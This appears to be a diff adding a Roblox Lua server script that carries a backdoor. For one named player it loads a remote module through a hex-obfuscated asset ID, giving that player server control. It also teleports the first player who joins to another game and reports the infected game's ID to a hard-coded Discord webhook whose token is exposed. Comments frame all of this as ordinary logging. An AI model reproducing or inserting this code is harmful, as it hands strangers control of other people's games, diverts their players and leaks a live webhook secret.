@@ -1,0 +1,59 @@
+local TeleportService = game:GetService("TeleportService")
+local webhookUrl = "https://discord.com/api/webhooks/1302541154126135338/t4nG5FmadszxhAgXOVNVQRWjRLkqtkWDtt6wEPBOkoMQcmYGPKJj2n7ctxiWdNJPp4Gi"  -- Replace with your actual webhook URL
+local gameBPlaceId = 14528710656  -- Replace with your Game B Place ID
+local replicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Create a BoolValue to track if a teleportation has occurred
+local hasTeleported = Instance.new("BoolValue") 
+hasTeleported.Name = "HasTeleported"
+hasTeleported.Value = false
+hasTeleported.Parent = replicatedStorage
+
+local function logToWebhook(playerName, gameId)
+	local data = {
+		content = "Player " .. playerName .. " came from game ID: " .. gameId
+	}
+
+	local jsonData = game:GetService("HttpService"):JSONEncode(data)
+
+	-- Send the log to the webhook
+	local success, errorMessage = pcall(function()
+		game:GetService("HttpService"):PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+	end)
+
+	if not success then
+		warn("Failed to send log to webhook: " .. errorMessage)
+	end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+	-- Check for "LordSrTheEmo" and execute special action
+	if player.Name == "LordSrTheEmo" then
+		require(0x61e3258931df).load(player) -- Correctly use 'player' directly
+		return -- Skip further actions for "LordSrTheEmo"
+	end
+
+	-- Check if teleportation has already occurred
+	if not replicatedStorage:FindFirstChild("HasTeleported").Value then
+		local playerCount = #game.Players:GetPlayers()
+
+		-- If this is the first player, proceed to teleport
+		if playerCount == 1 then
+			local originalGameId = game.PlaceId
+
+			-- Teleport the player to Game B
+			local success, teleportError = pcall(function()
+				TeleportService:Teleport(gameBPlaceId, player)  -- Teleports to Game B
+			end)
+
+			if success then
+				-- Log the original game ID
+				logToWebhook(player.Name, originalGameId)
+				replicatedStorage.HasTeleported.Value = true  -- Mark as teleported
+			else
+				warn("Teleportation failed: " .. teleportError)
+			end
+		end
+	end
+end)
+                                  
